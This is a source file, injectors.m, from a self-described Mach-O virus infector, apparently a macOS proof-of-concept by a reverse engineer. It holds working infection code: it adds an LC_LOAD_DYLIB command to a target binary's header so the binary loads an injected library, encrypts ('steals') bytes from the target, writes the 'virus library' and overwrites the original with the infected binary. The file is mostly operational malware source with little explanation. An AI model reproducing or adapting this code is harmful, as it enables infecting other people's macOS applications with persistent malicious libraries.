/*     _____                                                                  
 *  __|_    |__  ____   _  ______  ______  ______   __    _____  _____   ___  
 * |    |      ||    \ | ||   ___||   ___||   ___|_|  |_ /     \|     | |   | 
 * |    |      ||     \| ||   ___||   ___||   |__|_    _||     ||     \ |___| 
 * |____|    __||__/\____||___|   |______||______| |__|  \_____/|__|\__\|___| 
 *    |_____|                                                                 
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * injectors.m
 *
 */

#include "injectors.h"
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <math.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include "header.h"
#include "encrypt.h"
#include "fileoperations.h"
#include "configuration.h"

char searchPath[] = "@executable_path/";
char extension[] = ".patched";

/*
 * entrypoint function that will take care of the injection of fat and non-fat binaries
 */
uint8_t
inject_library(target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    // modify the binary header and add a new command
    if (inject_library_thin(targetInfo)) return 1;
    // steal bytes from the binary
    if (encrypt_target(targetInfo)) return 1;    
    // write the virus library
    // if this fails then we shouldn't write the main binary to avoid leaving the app into an unusable state
    if (write_library(targetInfo)) return 1;
    // write the infected target binary
    write_target(targetInfo->buffer, targetInfo->fileSize, targetInfo->targetBinaryPath);
    
    return 0;
}

/*
 * Inject a new library into the target buffer
 * The modified buffer is not written here
 */
uint8_t 
inject_library_thin(target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    // baseLoadCmdAddress will refer to the first load command address
    uint8_t * baseLoadCmdAddress = targetInfo->buffer + targetInfo->headerSize;
            
    char *injectionString = targetInfo->injectionHeaderPath;
    // verify if the library we want to add already exists 
    // if yes then it's a critical error
    if (verify_library_exists(baseLoadCmdAddress, targetInfo->nrLoadCmds, injectionString))
    {
#if DEBUG
        fprintf(stderr, "[ERROR] Library you are trying to add already exists in the binary!\n");
#endif
        return 1;
    }
    
    // build the command to be injected
    struct dylib_command injectionCommand;
    injectionCommand.cmd                         = LC_LOAD_DYLIB;
    injectionCommand.cmdsize                     = targetInfo->injectionSize;
    injectionCommand.dylib.timestamp             = 0;
    injectionCommand.dylib.current_version       = 0;
    injectionCommand.dylib.compatibility_version = 0;
    injectionCommand.dylib.name.offset           = 24;
    // copy the string, since there's enough space
    if (targetInfo->injectionStartOffset != NULL)
    {
        memcpy(targetInfo->injectionStartOffset + sizeof(struct dylib_command), injectionString, strlen(injectionString)+1);
        // copy the header
        memcpy(targetInfo->injectionStartOffset, &injectionCommand, sizeof(struct dylib_command));
        // add the new command to the mach-o header
        addcmd_to_header(targetInfo);
    }
    else
    {
#if DEBUG
        printf("[ERROR] InjectionStartOffset is NULL, something is wrong!\n");
#endif
        return 1;
    }
    return 0;
}

